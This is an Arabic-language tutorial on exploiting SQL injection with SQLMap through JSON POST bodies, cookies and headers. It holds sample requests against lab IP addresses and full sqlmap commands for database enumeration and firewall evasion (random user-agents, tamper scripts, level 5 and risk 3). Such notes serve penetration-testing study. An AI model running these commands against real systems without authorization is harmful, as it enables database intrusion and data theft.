
# استغلال ثغرة SQL Injection في JSON Requests

### شكل الطلب (Request)
الطلب ممكن يكون فيه ثغرة لو الـ JSON Payload اللي في POST Request بيتم التعامل معاه بشكل غير آمن. المثال ده بيوضح شكل الطلب:

```
POST /case4.php HTTP/1.1
Host: 94.237.53.113:36168
Content-Length: 10
Content-Type: application/json

{"id":"1"}
```

### استغلال الثغرة باستخدام SQLMap
أداة SQLMap ممكن تساعدك في استغلال الثغرة عن طريق الأمر ده:

```bash
sqlmap -u "http://94.237.49.212:54833/case4.php" --data '{"id":"1"}'
```

### التكنيكات المدعومة في SQLMap
SQLMap بتدعم مجموعة تكنيكات لاكتشاف واستغلال الثغرات، زي:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

لو عايز تستخدم كل التكنيكات مع بعض، شغل الأمر ده:

```
--technique=BEUSTQ
```

### ملاحظة
استخدام كل التكنيكات ممكن ياخد وقت طويل (من ساعة لساعتين)، حسب سرعة السيرفر وتعقيد الثغرة.

---

# استغلال ثغرة SQL Injection في Cookies

#### شكل الطلب (Request)
ممكن يكون فيه ثغرة لو الـ Cookie بتتعامل مع بيانات المستخدم بشكل غير آمن. المثال ده بيوضح شكل الطلب:

```
POST / HTTP/1.1
Cookie: session=xyzojidaoif; id=1; csrf-token=fodajifodjaofjadoifjd03909
Host: hossamshady.me

dofjaiodf=sdofija
```

#### استغلال الثغرة باستخدام SQLMap
لو عايز تختبر الـ Cookie وتشوف هل فيها SQL Injection، ممكن تستخدم أداة SQLMap بالأمر ده:

```bah
sqlmap -u "http://hossamshady.me" --cookie="session=xyzojidaoif; id=1; csrf-token=fodajifodjaofjadoifjd03909" --dbs
```

#### ملاحظة
- لو كان الـ `id=1` هو الجزء المحتمل فيه الثغرة، الأداة هتحاول تستغلها أو تبحث عن الثغرات المرتبطة.
- التست ممكن ياخد وقت، خاصة لو السيرفر بيستخدم حماية إضافية.
---

# استخدام SQLMap لتخطي جدران الحماية واختبار الثغرات

#### الفكرة
SQLMap بتساعدك في اختبار واكتشاف الثغرات عن طريق تخطي جدران الحماية باستخدام ملفات الطلبات (Requests) وتقنيات خداع.

---

#### شكل الطلب (Request)
الطلب بيتكتب في ملف نصي بالشكل ده:

```
POST /case4.php HTTP/1.1
Host: 94.237.53.113:36168
Content-Length: 10
Content-Type: application/json

{
  "id":"1"
}
```

- **طريقة إنشاء الملف:**
   ```
   nano file.txt
   ```
   بعد كتابة الطلب، احفظ الملف باستخدام `Ctrl+O` ثم `Ctrl+X`.

- **تشغيل SQLMap باستخدام الملف:**
   ```
   sqlmap -r file.txt
   ```

---

#### تقنيات الحماية وخداع جدران الحماية

##### 1. وكيل عشوائي (Random User-Agent)
- لتجنب الحظر عن طريق تغيير الـ User-Agent عشوائيًا:
   ```
   sqlmap -r file.txt --random-agent
   ```

##### 2. استبدال المسافات بالتعليقات (`space2comment`)
- استبدال المسافات بتعليقات لتجنب اكتشاف الاستعلام:
   ```
   sqlmap -r file.txt --tamper=space2comment
   ```

##### 3. تغيير الحروف الكبيرة والصغيرة (`randomcase`)
- تغيير الحروف في الاستعلام بشكل عشوائي:
   ```
   sqlmap -r file.txt --tamper=randomcase
   ```

##### 4. دمج التكنيكات
- استخدام أكتر من تكنيك معًا:
   ```
   sqlmap -r file.txt --tamper=space2comment,randomcase
   ```

---

#### استغلال الثغرات بتقنيات متعددة
SQLMap بتدعم التكنيكات التالية:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

- **تشغيل كل التكنيكات:**
   ```
   sqlmap -r file.txt --technique=BEUSTQ
   ```

---

#### الشكل النهائي للأمر
لدمج كل الخيارات المتقدمة (الخداع والتكنيكات):

```
sqlmap -r file.txt --random-agent --tamper=space2comment,randomcase --technique=BEUSTQ --delay=2
```

---

#### المميزات
1. **سهولة الاستخدام**: توفير الوقت عن طريق الملفات.
2. **مرونة متقدمة**: دمج التكنيكات المختلفة لتخطي الحماية.
3. **تقليل الحظر**: استخدام وكيل عشوائي وتقنيات التمويه.

---
# أمثلة أوامر متقدمة باستخدام SQLMap لتخطي جدران الحماية واختبار الثغرات

---

#### 1. اختبار متغير معين (Parameter Testing)
لاختبار متغير معين زي `id`:

```
sqlmap -u "https://example.com/file.ashx?id=1&name=oajof&age=xxx" -p id --technique=BEUSTQ --dbs
```
- **`-p id`**: تحديد المتغير المستهدف.
- **`--technique=BEUSTQ`**: تحديد التكنيكات المستخدمة.
- **`--dbs`**: لجلب قواعد البيانات.

---

#### 2. استخدام ملف الطلبات مع خيارات إضافية
لاختبار ملف طلب محدد مع تحسين الأداء وإضافة خيارات متقدمة:

```
sqlmap -r request.txt --batch --random-agent --tamper=space2comment --drop-set-cookie --banner --threads 10 --dbs
```
- **`--batch`**: تشغيل SQLMap في الوضع التلقائي بدون طلب تأكيدات.
- **`--drop-set-cookie`**: تجاهل الكوكيز المرسلة.
- **`--threads 10`**: تحسين الأداء باستخدام 10 خيوط.
- **`--banner`**: لجلب بيانات بانر قاعدة البيانات.

---

#### 3. اختبار الاستعلامات المتقدمة مع إعدادات مخصصة
لاختبار مستوى معين من المخاطر وتحديد نوع قاعدة البيانات:

```bash
sqlmap -u "target/?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries" --ignore-code 500
```
- **`--level 5`**: رفع مستوى الاختبار لخيارات أكثر.
- **`--risk 3`**: استخدام إعدادات عالية الخطورة.
- **`--dbms=MySQL`**: تحديد نوع قاعدة البيانات.
- **`--ignore-code 500`**: تجاهل أخطاء الكود 500.

---

#### 4. فحص الكوكيز والـ Headers
لاختبار الكوكيز والـ Headers المرسلة:

```bash
sqlmap -u xxxx --headers="Cookie: *" -H "x-forwarded-for: *" -H "x-forwarded-host: *"
```
- **`--headers`**: تحديد الهيدرز المراد اختبارها.
- **`x-forwarded-for`**: فحص عنوان IP المرسل.
- **`x-forwarded-host`**: فحص الهوست المرسل.

---

### النصائح
1. **استخدام خيارات `--random-agent` و`--tamper`**:
   - **`--random-agent`**: لتجنب الحظر باستخدام وكيل عشوائي.
   - **`--tamper=space2comment`**: تخطي الحماية عن طريق تعديل الاستعلام.

2. **رفع مستوى الأداء**:
   - استخدم **`--threads`** لتحسين سرعة التشغيل.
   - استخدم **`--batch`** لتشغيل أوامر تلقائية بدون تدخل.

3. **تحديد المخاطر والمستوى**:
   - قم باستخدام **`--level`** و**`--risk`** لاختبارات أكثر دقة.

---

### الشكل النهائي للأمر الكامل
دمج كل الخيارات المتقدمة في أمر واحد:

```
sqlmap -r request.txt --batch --random-agent --tamper=space2comment,randomcase --drop-set-cookie --threads 10 --technique=BEUSTQ --level 5 --risk 3 --dbms=MySQL --banner --ignore-code 500
```

---

#### المميزات
- **مرونة**: استهداف المتغيرات أو الهيدرز والكوكيز.
- **تخطي الحماية**: باستخدام الخيارات العشوائية وتقنيات التمويه.
- **تحسين الأداء**: باستخدام الخيوط والتشغيل التلقائي.

---

